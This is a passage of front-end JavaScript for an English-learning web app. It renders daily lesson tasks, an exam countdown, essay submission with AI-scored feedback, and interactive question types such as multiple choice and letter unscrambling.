function generateAllUnits() {
  const units = [];
  for (let i = 1; i <= 12; i++) {
    for (let j = 1; j <= 3; j++) {
      units.push(`${i}.${j}`);
    }
  }
  return units;
}

function getAvailableUnits() {
  const all = generateAllUnits();
  // Retrieve the highest completed unit from localStorage or default to currentUnit
  let highestUnit = localStorage.getItem('highestUnit') || activeCurrentUnit;
  const highestIndex = all.indexOf(highestUnit);
  const currentIndex = all.indexOf(currentUnit);

  // Ensure highestUnit is updated if currentUnit is beyond it
  if (currentIndex > highestIndex) {
    highestUnit = activeCurrentUnit;
    localStorage.setItem('highestUnit', activeCurrentUnit);
  }

  const available = all.slice(0, all.indexOf(highestUnit) + 1);
  console.log('[Units] 📗 Доступные до highestUnit:', available);
  return available;
}


function updateTaskCount() {
  const taskItems = document.querySelectorAll('.task-progress-card');
  const total = taskItems.length;
  const completed = [...taskItems].filter(el => el.classList.contains('disabled')).length;

  const taskCountElement = document.getElementById('task-count');
  if (!taskCountElement) return;

  taskCountElement.innerHTML = `
    Today's Tasks 
    <span class="task-badge">${completed} / ${total} completed</span>
  `;
}


function hideNavigation() {
  const nav = document.querySelector('nav');
  if (nav) {
    nav.classList.add('nav-hidden');
  } else {
    console.warn('Navigation element not found');
  }
}

function showNavigation() {
  const nav = document.querySelector('nav');
  if (nav) {
    nav.classList.remove('nav-hidden');
  } else {
    console.warn('Navigation element not found');
  }
}

function toggleNavigation() {
  const nav = document.querySelector('nav');
  nav.classList.toggle('nav-hidden');
}

let examEnded = false;
let zeroReachedTime = null;
let remainingTime = null;
let localTimerInterval = null;
let examResults = {};
let examTaskTitle = 'Exam'; // Название, заменяется динамически при рендере

function fetchInitialExamTime() {
  fetch('/get_remaining_time')
    .then(res => res.json())
    .then(data => {
      if (data.remaining_time !== undefined) {
        remainingTime = data.remaining_time;
        updateExamDisplay();
        startLocalCountdown();
      } else {
        remainingTime = null;
        updateExamDisplay();
      }
      fetchExamResults();
    })
    .catch(err => {
      console.error('Failed to fetch exam time:', err);
      remainingTime = null;
      updateExamDisplay();
      fetchExamResults();
    });
}

function startLocalCountdown() {
  if (localTimerInterval) clearInterval(localTimerInterval);
  localTimerInterval = setInterval(() => {
    if (remainingTime > 0) {
      remainingTime--;
      updateExamDisplay();
    } else if (remainingTime === 0 && !examEnded) {
      if (!zeroReachedTime) {
        zeroReachedTime = Date.now();
      } else if (Date.now() - zeroReachedTime >= 10000) {
        fetch('/api/end-exam', { method: 'POST' })
          .then(res => res.json())
          .then(res => {
            console.log('Exam ended:', res.message);
            examEnded = true;
            clearInterval(localTimerInterval);
          })
          .catch(err => console.error('Failed to end exam:', err));
      }
    }
  }, 1000);
}

function updateExamDisplay() {
  const examItem = document.getElementById('final-exam-item');
  if (!examItem) return;

  const currentUser = sessionStorage.getItem('username');
  const userData = examResults && examResults[currentUser];

  let minutes = 0, seconds = 0, inProgress = false;

  if (typeof remainingTime === 'number' && remainingTime >= 0) {
    inProgress = true;
    minutes = Math.floor(remainingTime / 60);
    seconds = remainingTime % 60 | 0;
  }

  const percent = userData ? Math.round(userData.correct_percentage) : 0;
  const pctText = `${percent}%`;
  const countText = userData
    ? `${userData.correct} out of ${userData.total_questions}`
    : `0 out of 0`;

  let statusHTML = '';
  let barFill = `${percent}%`;
  let cursor = 'default';
  let clickHandler = null;

  if (percent > 0) {
    // ✅ Задания есть → считаем "Done", блокируем
    statusHTML = `
      <div class="exam-status" style="background: rgba(23,162,184,0.85);">
        <i class="fas fa-check-circle"></i> Done
        <span class="timer">--:--</span>
      </div>`;
    barFill = `${percent}%`;
  } else if (inProgress) {
    // 🟡 Идёт экзамен → доступен клик
    statusHTML = `
      <div class="exam-status">
        <i class="fas fa-hourglass-half"></i> In Progress
        <span class="timer">${minutes}:${seconds < 10 ? '0'+seconds : seconds}</span>
      </div>`;
    cursor = 'pointer';
    clickHandler = () => {
      localStorage.setItem('openExamTask', 'true');
      window.location.href = '/chat';
    };
  } else if (typeof remainingTime !== 'number') {
    // ⏳ Not started
    statusHTML = `
      <div class="exam-status" style="background: rgba(108,117,125,0.85);">
        <i class="fas fa-clock"></i> Not started
        <span class="timer">--:--</span>
      </div>`;
  } else {
    // ❌ Завершено
    statusHTML = `
      <div class="exam-status" style="background: rgba(220,53,69,0.85);">
        <i class="fas fa-ban"></i> Unavailable
        <span class="timer">--:--</span>
      </div>`;
  }

  examItem.innerHTML = `
    <div class="exam-icon">
      <img src="/static/icons/exam.png" alt="Exam Icon" style="filter: drop-shadow(0 2px 6px rgba(0,0,0,0.4)); width:40px; height:40px;">
    </div>
    <div class="exam-title">${examTaskTitle}${(percent > 0 && !inProgress) ? ' (Completed)' : ''}</div>
    ${statusHTML}
    <div class="final-exam-progress-bar">
      <div class="final-exam-progress-bar__fill" style="width: ${barFill}"></div>
    </div>
    <div class="final-exam-texts">
      <span class="final-exam-progress-text">${pctText}</span>
    </div>
    <span class="final-exam-count-text">${countText}</span>
  `;

  const fillEl = examItem.querySelector('.final-exam-progress-bar__fill');
  if (fillEl) {
    fillEl.classList.remove('low', 'medium', 'high');
    if (percent < 50) fillEl.classList.add('low');
    else if (percent < 80) fillEl.classList.add('medium');
    else fillEl.classList.add('high');
  }

  // Применить поведение клика и курсора
  examItem.style.cursor = cursor;
  examItem.onclick = clickHandler;

  updateTaskCount();
}




// ----------------------------
// 1. Рендер списка Today’s Tasks с лоадером и центрированием
// ----------------------------
async function renderTasksSection() {
  const container = document.getElementById('today');
  container.querySelectorAll('.tasks-section, .no-tasks-placeholder').forEach(el => el.remove());

  if (!currentUnit || typeof currentUnit !== 'string') {
    console.warn('[Tasks] ⚠️ currentUnit некорректен:', currentUnit);
    renderNoTasksPlaceholder(container);
    return;
  }
  if (!currentLevel) {
    console.warn('[Tasks] ⚠️ currentLevel не задан');
    renderNoTasksPlaceholder(container);
    return;
  }

  const section = document.createElement('div');
  section.className = 'tasks-section loading';
  section.style.display = 'flex';
  section.style.flexDirection = 'column';
  section.style.alignItems = 'center';
  section.style.minHeight = '150px';

  const loader = document.createElement('div');
  loader.className = 'container-exam-loading';
  loader.innerHTML = `
    <div class="loader">
      <div class="crystal"></div>
      <div class="crystal"></div>
      <div class="crystal"></div>
      <div class="crystal"></div>
      <div class="crystal"></div>
      <div class="crystal"></div>
    </div>
  `;
  section.appendChild(loader);
  container.appendChild(section);

  try {
    const [tasksRes, resultsRes, avgRes] = await Promise.all([
      fetch(`/api/get-today-questions?level=${encodeURIComponent(currentLevel)}&unit=${encodeURIComponent(currentUnit)}`),
      fetch(`/api/get-results?level=${encodeURIComponent(currentLevel)}&unit=${encodeURIComponent(currentUnit)}`),
      fetch(`/api/get-results/average?level=${encodeURIComponent(currentLevel)}&unit=${encodeURIComponent(currentUnit)}&username=${encodeURIComponent(currentUser)}`)
    ]);
    if (!tasksRes.ok || !resultsRes.ok || !avgRes.ok) throw new Error('Ошибка запроса');

    const { today_tasks } = await tasksRes.json();
    const resultsData = await resultsRes.json();
    const userResult = resultsData[currentUser] || {};
    const avgData = await avgRes.json();
    const userAvg = avgData[currentUser] || { average_percent: 0, submitted_count: 0, total_tasks: today_tasks.length };

    const writingAIBlock = today_tasks.find(task => task.title === 'Writing AI');
    if (writingAIBlock) {
      const writingTask = {
        title: "Writing AI",
        type: "writing",
        questions: [{
          type: "writing",
          text: writingAIBlock.questions && writingAIBlock.questions.topic
            ? `Write an essay the topic: “${writingAIBlock.questions.topic}”.`
            : "Write an essay the advantages and disadvantages of public transport. Aim for 70+ words.",
          id: "Writing Topic ID 1"
        }]
      };

      const existingWritingTaskIndex = today_tasks.findIndex(task => 
        task.title === 'Writing AI' || task.type === 'writing' || task.title.toLowerCase().includes('writing')
      );
      if (existingWritingTaskIndex !== -1) {
        today_tasks[existingWritingTaskIndex] = writingTask;
      }
    }

    section.classList.remove('loading');
    section.innerHTML = '';

    const avgContainer = document.createElement('div');
    avgContainer.className = 'average-progress-container';
    if (typeof activeCurrentUnit !== 'undefined' && currentUnit !== activeCurrentUnit) {
      avgContainer.classList.add('disabled');
    }
    const avgPercent = Math.min(Math.round(userAvg.average_percent), 100);
    const submittedCount = userAvg.submitted_count || 0;
    const totalTasks = userAvg.total_tasks || 0;

    const title = document.createElement('span');
    title.className = 'average-progress-title';
    title.textContent = "Today's Tasks";

    const taskCount = document.createElement('span');
    taskCount.className = 'average-progress-count';
    taskCount.textContent = `${submittedCount}/${totalTasks} tasks`;

    const progressBar = document.createElement('div');
    progressBar.className = 'average-progress-bar';
    progressBar.style.setProperty('--progress-width', `${avgPercent}%`);

    const strikeIcon = document.createElement('i');
    strikeIcon.className = 'fas fa-fire strike-icon';
    if (avgPercent >= 80) {
      strikeIcon.classList.add('strike-active');
    }
    progressBar.appendChild(strikeIcon);

    const progressText = document.createElement('span');
    progressText.className = 'average-progress-percent';
    progressText.textContent = `${avgPercent}%`;

    avgContainer.append(title, taskCount, progressBar, progressText);
    section.appendChild(avgContainer);

    section.innerHTML += `<h2 id="task-count" style="display:none;">Today's Tasks</h2>`;

    const typePriority = ['homework', 'grammar', 'vocabulary', 'listening', 'reading', 'writing'];

    let examTask = null;
    let filteredTasks = today_tasks.filter(block => {
      const lowerTitle = block.title.toLowerCase();
      if (lowerTitle.includes('final exam') || lowerTitle.includes('weekly exam')) {
        examTask = block;
        return false;
      }
      return true;
    });

    const showExam = typeof remainingTime === 'number' && remainingTime >= 0;

    if (!filteredTasks.length && !examTask && !showExam) {
      renderNoTasksPlaceholder(container);
      return;
    }

    filteredTasks.sort((a, b) => {
      const aKey = a.title.toLowerCase();
      const bKey = b.title.toLowerCase();
      const aIndex = typePriority.findIndex(type => aKey.includes(type));
      const bIndex = typePriority.findIndex(type => bKey.includes(type));
      return (aIndex === -1 ? 99 : aIndex) - (bIndex === -1 ? 99 : bIndex);
    });

    filteredTasks.forEach(block => {
      const title = block.title;
      const result = userResult[title];
      const isCompleted = result?.submitted === true;
      const percent = Math.round(result?.percent || 0);
      const hasReward = isCompleted && percent >= 80;

      const card = document.createElement('div');
      card.className = 'task-progress-card';

      const isWriting = block.type === 'writing';

      if (isCompleted && !isWriting) {
        card.classList.add('disabled');
      }

      if (!isCompleted || isWriting) {
        card.classList.add('clickable');
        card.onclick = () => {
          console.log('Attempting to open task:', title);
          console.log('Task result:', result);
          console.log('Block data:', block);

          if (!block.questions || block.questions.length === 0) {
            console.warn('No questions found for:', title);
            alert(`Cannot open ${title} - no questions found.`);
            return;
          }

          if (isWriting) {
            console.log('Opening writing task...');
            openWritingTaskPage(title, block.questions);
          } else {
            console.log('Opening non-writing task...');
            openTodayTaskPage(title, block.questions);
          }
        };
      }

      const key = title.toLowerCase();
      let iconClass = 'fa-star';
      let iconColor = 'linear-gradient(135deg, #3f87ff, #8058f5)';
      if (key.includes('homework')) {
        iconClass = 'fa-pencil-square';
        iconColor = 'linear-gradient(135deg, #ff9800, #f44336)';
      } else if (key.includes('grammar')) {
        iconClass = 'fa-book-open';
        iconColor = 'linear-gradient(135deg, #4caf50, #2e7d32)';
      } else if (key.includes('vocabulary')) {
        iconClass = 'fa-language';
        iconColor = 'linear-gradient(135deg, #2196f3, #1565c0)';
      } else if (key.includes('listening')) {
        iconClass = 'fa-headphones';
        iconColor = 'linear-gradient(135deg, #9c27b0, #6a1b9a)';
      } else if (key.includes('reading')) {
        iconClass = 'fa-book-reader';
        iconColor = 'linear-gradient(135deg, #00bcd4, #0097a7)';
      } else if (key.includes('writing')) {
        iconClass = 'fa-pen';
        iconColor = 'linear-gradient(135deg, #f06292, #d81b60)';
      } else if (key.includes('fun')) {
        iconClass = 'fa-play';
        iconColor = 'linear-gradient(135deg, #4caf50, #8bc34a)';
      }

      const icon = document.createElement('div');
      icon.className = 'task-progress-icon';
      icon.style.background = iconColor;
      icon.innerHTML = `<i class="fa-solid ${iconClass}"></i>`;

      const textGroup = document.createElement('div');
      textGroup.className = 'task-progress-main';

      const titleDiv = document.createElement('div');
      titleDiv.className = 'task-progress-title';
      titleDiv.textContent = title;

      let taskCount = null;
      if (result?.submitted) {
        taskCount = document.createElement('div');
        taskCount.className = 'task-progress-count';
        const totalTasks = result.total || (block.questions ? block.questions.length : 0);
        const correctTasks = result.correct || 0;
        taskCount.textContent = `${correctTasks} correct out of ${totalTasks} tasks`;
      }

      const progressContainer = document.createElement('div');
      progressContainer.className = 'task-progress-container';

      const progressBarWrapper = document.createElement('div');
      progressBarWrapper.className = 'task-progress-bar-wrapper';

      const progressBar = document.createElement('div');
      progressBar.className = 'task-progress-bar';
      progressBar.style.width = '0%';

      if (percent >= 80) {
        progressBar.style.background = 'linear-gradient(90deg, #6dee6d, #32cd32)';
      } else if (percent >= 60) {
        progressBar.style.background = 'linear-gradient(90deg, #ffd54f, #ffb300)';
      } else {
        progressBar.style.background = 'linear-gradient(90deg, #ef5350, #d32f2f)';
      }

      setTimeout(() => {
        progressBar.style.width = `${Math.min(percent, 100)}%`;
      }, 50);

      const progressText = document.createElement('span');
      progressText.className = 'task-progress-percent';
      progressText.textContent = `${percent}%`;

      progressBarWrapper.appendChild(progressBar);
      progressContainer.append(progressBarWrapper, progressText);
      textGroup.append(titleDiv);
      if (taskCount) textGroup.append(taskCount);
      textGroup.append(progressContainer);

      const award = document.createElement('div');
      award.className = 'task-progress-award';
      if (hasReward) {
        award.innerHTML = `<i class="fa-solid fa-star"></i> 100`;
        award.classList.add('pop-bounce');
      } else {
        award.style.display = 'none';
      }

      card.append(icon, textGroup, award);

      if (isWriting && result?.ai_detected) {
        const errorOverlay = document.createElement('div');
        errorOverlay.className = 'ai-error-overlay';
        const errorContent = document.createElement('div');
        errorContent.className = 'ai-error-overlay-content';
        errorContent.innerHTML = '<i class="fa-solid fa-triangle-exclamation"></i> AI Detected';
        errorOverlay.appendChild(errorContent);
        card.appendChild(errorOverlay);
      }

      section.appendChild(card);
    });

    if (examTask || showExam) {
      window.examTaskTitle = examTask?.title || 'Exam';

      const finalExamContainer = document.createElement('div');
      finalExamContainer.className = 'accordion';
      finalExamContainer.innerHTML = `
        <div class="accordion-header" onclick="toggleAccordion(this)">
          <span>${examTask?.title || 'Exam'}</span>
          <i class="fas fa-chevron-down"></i>
        </div>
        <div class="accordion-content" id="final-exam-item">
          <!-- Контент загружается через updateExamDisplay() -->
        </div>
      `;
      section.appendChild(finalExamContainer);

      updateExamDisplay();
    }

    updateTaskCount();
  } catch (err) {
    section.classList.remove('loading');
    section.style.display = 'none';
    console.error('[Tasks] ❌ Ошибка загрузки заданий:', err);
    renderNoTasksPlaceholder(container);
  }
}

function finishWritingAI(title, questions) {
  initExamSecurity(false);
  updateStrikes();
  showNavigation();
  const answers = {};
  const errors = [];
  const content = document.getElementById('todaytasks-content');

  content.querySelectorAll('textarea.writing-task-textarea').forEach(textarea => {
    const qid = textarea.dataset.qid;
    const val = textarea.value.trim();
    if (val) {
      const wordCount = val.split(/\s+/).filter(word => word.length > 0).length;
      if (wordCount < 30 || wordCount > 200) {
        errors.push(`Your essay should be between 30 and 200 words (current: ${wordCount} words).`);
      } else {
        answers[qid] = val;
      }
    } else {
      errors.push(`Please provide an essay for the writing task (question ${qid}).`);
    }
  });

  if (errors.length) {
    showToastNotification(errors[0], 'warning');
    return;
  }

  const payload = {
    level: currentLevel,
    unit: currentUnit,
    username: currentUser,
    title,
    answers,
    questions
  };

  document.getElementById('updateModal').style.display = 'flex';
  startUpdateStatusText();

  fetch('/api/submit-writing-task', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  })
    .then(res => res.json().then(data => ({ ok: res.ok, data })))
    .then(({ ok, data }) => {
      document.getElementById('updateModal').style.display = 'none';
      stopUpdateStatusText();

      if (!ok) throw new Error(data.error || 'Submission failed');

      const { feedback, scores, score } = data;
      const suggestions = feedback.suggestion || {};
      const resultHTML = [];


      questions.forEach(q => {

        if (feedback && scores) {
          resultHTML.push(`<div class="writing-feedback-card">`);
          resultHTML.push(`<div class="score-circle">${score}%</div>`);
          resultHTML.push(`<div class="accordion-writingai">`);

          const feedbackMap = [
            { label: "Task Achievement & Structure", key: "task_structure", iconClass: "fas fa-tasks" },
            { label: "Organization", key: "organization", iconClass: "fas fa-layer-group" },
            { label: "Grammar", key: "grammar", iconClass: "fas fa-pen-nib" },
            { label: "Vocabulary", key: "vocabulary", iconClass: "fas fa-book" }
          ];

          feedbackMap.forEach(({ label, key, iconClass }) => {
            resultHTML.push(`
              <div class="accordion-item">
                <button class="accordion-header" onclick="this.classList.toggle('active'); this.nextElementSibling.classList.toggle('open');">
                  <span class="feedback-icon"><i class="${iconClass}"></i></span>
                  <span class="label">${label}</span>
                  <span class="score">${scores[key]}/25</span>
                </button>
                <div class="accordion-body">
                  <p>${feedback[key].replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')}</p>
                  ${suggestions[key] ? `<div class="suggestion-block"><strong><i class="fas fa-lightbulb"></i> Suggestion</strong>${suggestions[key]}</div>` : ''}
                </div>
              </div>
            `);
          });

          resultHTML.push(`</div></div>`);
        } else {
          resultHTML.push(`<p class="feedback-warning">No feedback available.</p>`);
        }
      });

      content.innerHTML = resultHTML.join('');

      if (score >= 80) {
        new Audio('/static/music/Coins_Rewarded.mp3').play().catch(console.log);
      }

      document.querySelectorAll('.rain-drop, .lightning-flash, .lightning-icon').forEach(el => el.remove());

      const header = document.getElementById('todaytasks-header');
      header.classList.add('summer-scene');

      const moon = document.createElement('div');
      moon.className = 'moon';
      header.appendChild(moon);

      const tree = document.createElement('div');
      tree.className = 'summer-tree';
      header.appendChild(tree);

      for (let i = 0; i < 30; i++) {
        const star = document.createElement('div');
        star.className = 'star';
        star.style.top = `${Math.random() * 60}%`;
        star.style.left = `${Math.random() * 100}%`;
        star.style.animationDelay = `${Math.random() * 4}s`;
        header.appendChild(star);
      }

      for (let i = 0; i < 8; i++) {
        const firefly = document.createElement('div');
        firefly.className = 'firefly';
        firefly.style.top = `${60 + Math.random() * 40}%`;
        firefly.style.left = `${Math.random() * 100}%`;
        firefly.style.animationDelay = `${Math.random() * 5}s`;
        header.appendChild(firefly);
      }

      window.scrollTo({ top: 0, behavior: 'smooth' });

      document.getElementById('finish-tasks-btn').style.display = 'none';
      let doneBtn = document.getElementById('done-tasks-btn');

      if (!doneBtn) {
        doneBtn = document.createElement('button');
        doneBtn.id = 'done-tasks-btn';
        doneBtn.className = 'btn btn-success';
        doneBtn.textContent = 'Done';
        doneBtn.onclick = () => {
          showPage('today');
          content.innerHTML = '';
          doneBtn.style.display = 'none';
          document.getElementById('finish-tasks-btn').style.display = 'inline-block';
          renderTasksSection();
        };
        document.getElementById('todaytasks-header').appendChild(doneBtn);
      } else {
        doneBtn.style.display = 'inline-block';
      }

      document.getElementById('done-tasks-btn').onclick = () => {
        showPage('today');
        content.innerHTML = '';
        document.getElementById('done-tasks-btn').style.display = 'none';
        document.getElementById('finish-tasks-btn').style.display = 'inline-block';
        const floating = document.getElementById('floating-finish-btn');
        if (floating) floating.style.display = 'none';
        renderTasksSection();
      };

      fetch(`/api/update-results?level=${encodeURIComponent(currentLevel)}&unit=${encodeURIComponent(currentUnit)}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          username: currentUser,
          taskTitle: title,
          percent: score,
          submitted: true
        })
      }).then(() => renderTasksSection());
    })
    .catch(err => {
      console.error('[Writing] ❌ Error submitting writing task:', err);
      document.getElementById('updateModal').style.display = 'none';
      stopUpdateStatusText();
      showToastNotification(err.message, 'error');
    });
}





async function openWritingTaskPage(title, questions) {
  initExamSecurity(true);
  hideNavigation();
  showPage('todaytasks');

  const header = document.getElementById('header-today');
  const unit = document.getElementById('todaytasks-unit');
  header.textContent = title;
  unit.textContent = `Unit ${currentUnit}`;

  document.querySelectorAll('.moon, .summer-tree, .star, .firefly').forEach(el => el.remove());
  document.getElementById('todaytasks-header').classList.remove('summer-scene');

  const rainAndLightningHTML = `
    <div class="lightning-flash"></div>
    ${[10, 20, 30, 40, 50, 60, 70].map((left, i) =>
      `<span class="rain-drop" style="left: ${left}%; animation-delay: ${i * 0.2}s;"></span>`
    ).join('')}
    ${Array.from({ length: 3 }).map(() =>
      `<div class="lightning-drop" style="left: ${Math.random() * 90 + 5}%; animation-delay: ${Math.random() * 3}s;"></div>`
    ).join('')}
  `;
  header.insertAdjacentHTML('beforeend', rainAndLightningHTML);

  const content = document.getElementById('todaytasks-content');
  content.innerHTML = '';

  let resultData = null;
  try {
    const res = await fetch(`/api/get-results?level=${encodeURIComponent(currentLevel)}&unit=${encodeURIComponent(currentUnit)}`);
    const json = await res.json();
    resultData = json?.[currentUser]?.['Writing AI'];
  } catch (err) {
    console.error('Error loading results:', err);
  }

  const submitted = resultData?.submitted;

  questions.forEach((q, qi) => {
    const wrapper = document.createElement('div');
    wrapper.className = 'exam-question-block';

    // --- Разделение текста по <> ---
    const parts = q.text.split('<>').map(p => p.trim()).filter(p => p.length > 0);

    parts.forEach((part, pi) => {
      const questionHeader = document.createElement('div');
      questionHeader.className = 'question-header';

      const numberSpan = document.createElement('span');
      numberSpan.className = 'question-number';
      if (parts.length === 1) {
        numberSpan.textContent = `${qi + 1}`;
      } else {
        numberSpan.textContent = `${pi + 1}`;
      }

      questionHeader.appendChild(numberSpan);

      const textSpan = document.createElement('div');
      textSpan.className = 'question-text';
      textSpan.innerHTML = part;
      questionHeader.appendChild(textSpan);

      wrapper.appendChild(questionHeader);
    });

    if (submitted) {
      initExamSecurity(false);
      const result = resultData.details?.find(d => d.question_id === `Writing Topic ID ${qi + 1}`);
      if (result) {
        const feedback = result.feedback || {};
        const suggestion = feedback.suggestion || {};
        const scores = result.scores_breakdown || {};

        const scoreBlock = `
          <div class="writing-score-block">Score: ${result.score}/100</div>
        `;

        const feedbackBlock = Object.entries(feedback)
          .filter(([k]) => k !== 'suggestion')
          .map(([category, text]) => `
            <div class="writing-feedback-card">
              <h4>${category.charAt(0).toUpperCase() + category.slice(1)}</h4>
              <p>${text}</p>
              ${suggestion[category] ? `<div class="suggestion-block"><strong>Suggestion:</strong> ${suggestion[category]}</div>` : ''}
            </div>
          `).join('');

        wrapper.insertAdjacentHTML('beforeend', scoreBlock + feedbackBlock);
      } else {
        wrapper.innerHTML += `<div class="writing-feedback-card"><p>No result available.</p></div>`;
      }
    } else {
      const textareaWrapper = document.createElement('div');
      textareaWrapper.style.position = 'relative';

      const textarea = document.createElement('textarea');
      textarea.className = 'writing-task-textarea';
      textarea.placeholder = 'Write your essay here (30+ words)...';
      textarea.name = `q${q.id}`;
      textarea.dataset.qid = q.id;

      const wordCounter = document.createElement('div');
      wordCounter.className = 'word-count';
      wordCounter.textContent = '0 words';
      wordCounter.style.position = 'absolute';
      wordCounter.style.bottom = '15px';
      wordCounter.style.right = '10px';
      wordCounter.style.fontSize = '12px';
      wordCounter.style.color = '#666';

      textarea.addEventListener('input', () => {
        const wordCount = textarea.value.trim().split(/\s+/).filter(w => w.length > 0).length;
        wordCounter.textContent = `${wordCount} word${wordCount === 1 ? '' : 's'}`;
      });

      textarea.addEventListener('blur', () => {
        const wordCount = textarea.value.trim().split(/\s+/).filter(w => w.length > 0).length;
        if (wordCount < 30) {
          showToastNotification(`Your writing must be at least 30 words. Currently: ${wordCount}`, 'warning');
        }
      });

      textareaWrapper.appendChild(textarea);
      textareaWrapper.appendChild(wordCounter);
      wrapper.appendChild(textareaWrapper);
    }

    content.appendChild(wrapper);
  });

  window.scrollTo({ top: 0, behavior: 'smooth' });

  let floatingBtn = document.getElementById('floating-finish-btn');
  if (!floatingBtn && !submitted) {
    floatingBtn = document.createElement('button');
    floatingBtn.id = 'floating-finish-btn';
    floatingBtn.innerHTML = '<i class="fas fa-check"></i> Finish Task';
    document.body.appendChild(floatingBtn);
  }
  if (floatingBtn) {
    floatingBtn.style.display = submitted ? 'none' : 'block';
    floatingBtn.onclick = () => {
      floatingBtn.style.display = 'none';
      finishWritingAI(title, questions);
    };
  }

  document.getElementById('done-tasks-btn').style.display = 'none';
  const finishBtn = document.getElementById('finish-tasks-btn');
  finishBtn.style.display = submitted ? 'none' : 'inline-block';
  finishBtn.onclick = () => {
    floatingBtn.style.display = 'none';
  };
}













// ----------------------------
// 2. Открытие страницы с вопросами и рендер
// ----------------------------

function openTodayTaskPage(title, questions) {
  hideNavigation();
  showPage('todaytasks');
  const header = document.getElementById('header-today');
  const unit = document.getElementById('todaytasks-unit');
  header.textContent = title;
  unit.textContent = `Unit ${currentUnit}`;

  // Remove summer elements
  document.querySelectorAll('.moon, .summer-tree, .star, .firefly').forEach(el => el.remove());
  document.getElementById('todaytasks-header').classList.remove('summer-scene');

  // Add rain and lightning
  const rainAndLightningHTML = `
    <div class="lightning-flash"></div>
    ${[10, 20, 30, 40, 50, 60, 70].map((left, i) =>
      `<span class="rain-drop" style="left: ${left}%; animation-delay: ${i * 0.2}s;"></span>`
    ).join('')}
    ${Array.from({length: 3}).map(() =>
      `<div class="lightning-drop" style="left: ${Math.random() * 90 + 5}%; animation-delay: ${Math.random() * 3}s;"></div>`
    ).join('')}
  `;
  header.insertAdjacentHTML('beforeend', rainAndLightningHTML);

  const content = document.getElementById('todaytasks-content');
  content.innerHTML = '';

  questions.forEach((q, qi) => {
    const wrapper = document.createElement('div');
    wrapper.className = 'exam-question-block';

    if (q.type === 'reading' && q.text) {
      const rich = document.createElement('div');
      rich.className = 'exam-parent-question';
      rich.innerHTML = q.text;
      wrapper.appendChild(rich);
    }

    if (q.type === 'listening' && q.audio) {
      const div = document.createElement('div');
      div.innerHTML = `
        <div class="listening-audio">
          <div class="custom-audio-player">
            <button class="custom-play-btn"><i class="fas fa-play"></i></button>
            <div class="custom-audio-waves"><div class="progress"></div></div>
            <div class="custom-time-display">0:00</div>
          </div>
          <audio src="${q.audio}" preload="metadata" style="display:none;"></audio>
        </div>`;
      wrapper.appendChild(div.firstElementChild);
    }

    if (q.type === 'video' && (q['link-youtube'] || q['local-link'])) {
      const div = document.createElement('div');
      div.className = 'video-question';
      if (q['link-youtube'] && q['link-youtube'].includes('<iframe')) {
        div.innerHTML = `
          <div class="video-player">
            ${q['link-youtube']}
          </div>`;
      } else if (q['local-link']) {
        div.innerHTML = `
          <div class="video-player">
            <video controls width="100%" preload="metadata">
              <source src="${q['local-link']}" type="video/mp4">
              Your browser does not support the video tag.
            </video>
          </div>`;
      }
      wrapper.appendChild(div.firstElementChild);
    }

    if (q.text && q.type !== 'reading') {
      const heading = document.createElement('h3');
      heading.className = 'question-title';
      heading.innerHTML = `${qi + 1}. ${q.text}`;
      wrapper.appendChild(heading);
    }

    const subList = Array.isArray(q.subquestions) ? q.subquestions : [q];
    const groupedSelectOptions = [];
    const groupedWriteIn = [];
    const groupedBoxChoose = [];

    subList.forEach(sub => {
      if (sub.type === 'select-options') {
        groupedSelectOptions.push(sub);
      } else if (sub.type === 'write-in-blank') {
        groupedWriteIn.push(sub);
      } else if (sub.type === 'box-choose') {
        groupedBoxChoose.push(sub);
      }
    });

    subList.forEach(sub => {
      if (sub.type === 'select-options' || sub.type === 'write-in-blank' || sub.type === 'box-choose') return;
      const subDiv = document.createElement('div');
      subDiv.className = 'exam-subquestion';

      if (sub.type !== 'unscramble') {
        const p = document.createElement('p');
        p.className = 'question-text';
        p.innerHTML = `${sub.id || 'Q'}. ${sub.text || ''}`;
        subDiv.appendChild(p);
      }

      const group = document.createElement('div');
      group.className = 'question-options';

      if (['multiple_choice', 'true_false'].includes(sub.type)) {
        (sub.options || ['True', 'False']).forEach((opt, i) => {
          const letter = String.fromCharCode(65 + i);
          const id = `opt-${sub.id}-${letter}`;
          group.innerHTML += `
            <div class="option-group">
              <input type="radio" name="q${sub.id}" value="${opt}" id="${id}">
              <label for="${id}">
                <span class="option-letter">${letter}</span>
                <span class="option-text">${opt}</span>
              </label>
            </div>`;
        });
      } else if (sub.type === 'unscramble') {
        const letters = sub.text.trim().split('').filter(ch => ch !== ' ');
        const shuffled = [...letters].sort(() => Math.random() - 0.5);
        const letterContainer = document.createElement('div');
        const inputContainer = document.createElement('div');
        letterContainer.className = 'unscramble-letters';
        inputContainer.className = 'unscramble-inputs';
        inputContainer.dataset.qid = sub.id;

        shuffled.forEach((letter, index) => {
          const span = document.createElement('span');
          span.className = 'unscramble-letter';
          span.textContent = letter;
          span.dataset.index = index;
          span.dataset.letter = letter;
          letterContainer.appendChild(span);
        });

        letters.forEach((_, index) => {
          const slot = document.createElement('span');
          slot.className = 'unscramble-input';
          slot.dataset.index = index;
          inputContainer.appendChild(slot);
        });

        group.appendChild(letterContainer);
        group.appendChild(inputContainer);

        letterContainer.querySelectorAll('.unscramble-letter').forEach(letterEl => {
          letterEl.onclick = () => {
            if (letterEl.classList.contains('used')) return;
            const emptySlot = inputContainer.querySelector('.unscramble-input:not(.filled)');
            if (emptySlot) {
              emptySlot.textContent = letterEl.dataset.letter;
              emptySlot.classList.add('filled');
              emptySlot.dataset.letterIndex = letterEl.dataset.index;
              letterEl.classList.add('used');
            }
          };
        });
        inputContainer.querySelectorAll('.unscramble-input').forEach(inputEl => {
          inputEl.onclick = () => {
            if (!inputEl.classList.contains('filled')) return;
            const idx = inputEl.dataset.letterIndex;
            const letterEl = letterContainer.querySelector(`.unscramble-letter[data-index="${idx}"]`);
            if (letterEl) letterEl.classList.remove('used');
            inputEl.textContent = '';
            inputEl.classList.remove('filled');
            delete inputEl.dataset.letterIndex;
          };
        });
      } else if (sub.type === 'picture') {
        if (sub.image) group.innerHTML += `<img src="${sub.image}" alt="Image" class="question-image">`;
        group.innerHTML += `<input type="text" name="q${sub.id}" class="image-answer" placeholder="Answer...">`;
      } else if (sub.type === 'listening') {
        group.innerHTML = `<input type="text" name="q${sub.id}" class="listening-input" placeholder="Your answer...">`;
      }

